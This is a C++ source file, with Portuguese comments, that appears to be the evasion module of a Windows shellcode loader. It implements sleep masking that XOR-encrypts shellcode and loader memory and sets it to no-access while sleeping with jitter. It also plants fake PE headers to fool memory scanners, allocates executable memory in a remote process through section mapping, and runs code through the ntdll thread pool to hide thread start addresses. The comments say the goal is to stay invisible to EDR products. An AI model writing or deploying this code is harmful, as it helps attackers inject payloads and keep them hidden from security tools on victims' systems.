#include "evasion.h"
#include "strenc.h"

EVASION_CTX g_EvasCtx = { 0 };

typedef NTSTATUS(NTAPI* fnRtlRandomEx)(PULONG Seed);
typedef NTSTATUS(NTAPI* fnRtlQueueWorkItem)(LPTHREAD_START_ROUTINE fn, PVOID ctx, ULONG flags);

static fnRtlRandomEx      pRtlRandomEx     = nullptr;
static fnRtlQueueWorkItem pRtlQueueWorkItem = nullptr;

static void ResolveFuncs()
{
    PVOID h = PebGetModuleBase(WENC(L"ntdll.dll"));
    if (!h) return;
    pRtlRandomEx     = (fnRtlRandomEx)     PebGetProcAddr(h, ENC("RtlRandomEx"));
    pRtlQueueWorkItem= (fnRtlQueueWorkItem) PebGetProcAddr(h, ENC("RtlQueueWorkItem"));
}

static ULONG Rand(PULONG seed)
{
    if (pRtlRandomEx) return pRtlRandomEx(seed);
    *seed = *seed * 1664525u + 1013904223u;
    return *seed;
}

static void chaverand(BYTE* key, SIZE_T len)
{
    ULONG seed = GetCurrentProcessId() ^ GetCurrentThreadId();
    ULARGE_INTEGER tsc;
    tsc.QuadPart = __rdtsc();
    seed ^= tsc.LowPart ^ tsc.HighPart;

    for (SIZE_T i = 0; i < len; i++)
    {
        seed = seed * 1664525u + 1013904223u;
        key[i] = (BYTE)((seed >> 16) & 0xFF);
        if (key[i] == 0) key[i] = 0xAB; 
    }
}

void XorRegion(PMASKED_REGION region)
{
    if (!region || !region->BaseAddress || !region->Size) return;

    BYTE*  p = (BYTE*)region->BaseAddress;
    for (SIZE_T i = 0; i < region->Size; i++)
        p[i] ^= region->XorKey[i % XOR_KEY_SIZE];

    region->IsEncrypted = !region->IsEncrypted;
}

// muda protecao da regiao: sleep=TRUE vira NOACCESS, FALSE vira PAGE_EXECUTE_READ
BOOL CloakRegion(PMASKED_REGION region, BOOL sleep)
{
    if (!region || !region->BaseAddress) return FALSE;

    ULONG old  = 0;
    PVOID  base = region->BaseAddress;
    SIZE_T size = region->Size;
    ULONG  prot = sleep ? PAGE_NOACCESS : PAGE_EXECUTE_READ;

    return NT_SUCCESS(SysNtProtectVirtualMemory(GetCurrentProcess(), &base, &size, prot, &old));
}

// planta um MZ/PE header fake na primeira pagina da regiao
// faz o scanner achar "metadados de modulo" e nao reclamar
BOOL PlantFakePEHeader(PVOID base, SIZE_T regionSize, const char* fakeModuleName)
{
    if (!base || regionSize < 0x1000) return FALSE;

    PVOID  pb  = base;
    SIZE_T ps  = 0x1000;
    ULONG  old = 0;

    if (!NT_SUCCESS(SysNtProtectVirtualMemory(GetCurrentProcess(), &pb, &ps, PAGE_READWRITE, &old)))
        return FALSE;

    BYTE* hdr = (BYTE*)base;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hdr;
    memset(dos, 0, sizeof(*dos));
    dos->e_magic  = IMAGE_DOS_SIGNATURE;
    dos->e_lfanew = 0x80;
    memcpy(hdr + 0x40, "This program cannot be run in DOS mode.\r\n$", 42);

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(hdr + 0x80);
    memset(nt, 0, sizeof(*nt));
    nt->Signature = IMAGE_NT_SIGNATURE;
    nt->FileHeader.Machine              = IMAGE_FILE_MACHINE_AMD64;
    nt->FileHeader.NumberOfSections     = 1;
    nt->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
    nt->FileHeader.Characteristics      = IMAGE_FILE_DLL | IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_LARGE_ADDRESS_AWARE;

    IMAGE_OPTIONAL_HEADER64* opt = &nt->OptionalHeader;
    opt->Magic                       = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    opt->MajorLinkerVersion          = 14;
    opt->SizeOfCode                  = (DWORD)(regionSize - 0x1000);
    opt->AddressOfEntryPoint         = 0x1000;
    opt->BaseOfCode                  = 0x1000;
    opt->ImageBase                   = (ULONGLONG)base;
    opt->SectionAlignment            = 0x1000;
    opt->FileAlignment               = 0x200;
    opt->MajorOperatingSystemVersion = 6;
    opt->MajorSubsystemVersion       = 6;
    opt->SizeOfImage                 = (DWORD)regionSize;
    opt->SizeOfHeaders               = 0x1000;
    opt->Subsystem                   = IMAGE_SUBSYSTEM_WINDOWS_GUI;
    opt->DllCharacteristics          = IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE | IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
    opt->SizeOfStackReserve          = 0x100000;
    opt->SizeOfStackCommit           = 0x1000;
    opt->SizeOfHeapReserve           = 0x100000;
    opt->SizeOfHeapCommit            = 0x1000;
    opt->NumberOfRvaAndSizes         = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    memset(sec, 0, sizeof(*sec));
    memcpy(sec->Name, ".text\0\0\0", 8);
    sec->Misc.VirtualSize = (DWORD)(regionSize - 0x1000);
    sec->VirtualAddress   = 0x1000;
    sec->SizeOfRawData    = (DWORD)(regionSize - 0x1000);
    sec->PointerToRawData = 0x1000;
    sec->Characteristics  = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;

    // protect original
    PVOID pb2 = base; SIZE_T ps2 = 0x1000; ULONG d = 0;
    SysNtProtectVirtualMemory(GetCurrentProcess(), &pb2, &ps2, old, &d);

    (void)fakeModuleName;
    return TRUE;
}

// jitter negativo relativo 
void JitterDelay(DWORD minMs, DWORD maxMs)
{
    ULONG seed  = (ULONG)(__rdtsc() & 0xFFFFFFFF);
    ULONG range = maxMs - minMs;
    if (!range) range = 1;
    ULONG ms = minMs + (Rand(&seed) % range);

    LARGE_INTEGER t;
    t.QuadPart = -((LONGLONG)ms * 10000LL);
    SysNtDelayExecution(FALSE, &t);
}

// encripta as regioes, esconde com NOACCESS, da sleep e restaura tudo
// enquanto ta dormindo o EDR nao ve pagina executavel nem conteudo reconhecivel
void SleepMasked(DWORD ms)
{
    if (g_EvasCtx.Shellcode.BaseAddress) XorRegion(&g_EvasCtx.Shellcode);
    if (g_EvasCtx.Loader.BaseAddress)    XorRegion(&g_EvasCtx.Loader);

    if (g_EvasCtx.Shellcode.BaseAddress) CloakRegion(&g_EvasCtx.Shellcode, TRUE);
    if (g_EvasCtx.Loader.BaseAddress)    CloakRegion(&g_EvasCtx.Loader,    TRUE);

    DWORD jitter = ms / 5;
    JitterDelay(ms - jitter, ms + jitter);

    if (g_EvasCtx.Shellcode.BaseAddress) CloakRegion(&g_EvasCtx.Shellcode, FALSE);
    if (g_EvasCtx.Loader.BaseAddress)    CloakRegion(&g_EvasCtx.Loader,    FALSE);

    if (g_EvasCtx.Shellcode.BaseAddress) XorRegion(&g_EvasCtx.Shellcode);
    if (g_EvasCtx.Loader.BaseAddress)    XorRegion(&g_EvasCtx.Loader);
}

// aloca via NtCreateSection + NtMapViewOfSection no processo REMOTO
PVOID SectionAllocRemote(HANDLE hProcess, SIZE_T size, ULONG protect, PHANDLE outSection)
{
    HANDLE hSec = NULL;
    LARGE_INTEGER maxSz;
    maxSz.QuadPart = (LONGLONG)size;

    NTSTATUS st = SysNtCreateSection(&hSec, SECTION_ALL_ACCESS, NULL, &maxSz,
                                     PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(st) || !hSec) {
        return nullptr;
    }

    PVOID  base   = nullptr;
    SIZE_T viewSz = 0;

    st = SysNtMapViewOfSection(hSec, hProcess, &base, 0, size,
                                NULL, &viewSz, 2, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(st)) { 
        SysNtClose(hSec); 
        return nullptr; 
    }

    if (outSection) *outSection = hSec;
    return base;
}

void SectionFree(PVOID base, HANDLE hSection)
{
    if (base)     SysNtUnmapViewOfSection(GetCurrentProcess(), base);
    if (hSection) SysNtClose(hSection);
}

// executa via thread pool do ntdll, o thread aparece com startAddress dentro do ntdll
// evita a assinatura NtCreatethread com startAddress apontando pro shellcode
BOOL ThreadPoolExec(LPTHREAD_START_ROUTINE callback, PVOID arg)
{
    if (!pRtlQueueWorkItem) {
        return FALSE;
    }
    
    NTSTATUS st = (NTSTATUS)pRtlQueueWorkItem(callback, arg, 0x80);
    BOOL result = NT_SUCCESS(st);
    
    return result;
}

BOOL InitEvasion(PVOID shellcodeBase, SIZE_T shellcodeSize, PVOID loaderBase, SIZE_T loaderSize)
{
    ResolveFuncs();

    g_EvasCtx.Shellcode.BaseAddress = shellcodeBase;
    g_EvasCtx.Shellcode.Size        = shellcodeSize;
    g_EvasCtx.Shellcode.IsEncrypted = FALSE;
    chaverand(g_EvasCtx.Shellcode.XorKey, XOR_KEY_SIZE);

    g_EvasCtx.Loader.BaseAddress = loaderBase;
    g_EvasCtx.Loader.Size        = loaderSize;
    g_EvasCtx.Loader.IsEncrypted = FALSE;
    chaverand(g_EvasCtx.Loader.XorKey, XOR_KEY_SIZE);

    if (shellcodeSize >= 0x1000) {
        PlantFakePEHeader(shellcodeBase, shellcodeSize, ENC("ntdll.dll"));
    }
    if (loaderSize >= 0x1000) {
        PlantFakePEHeader(loaderBase, loaderSize, ENC("kernel32.dll"));
    }

    return TRUE;
}
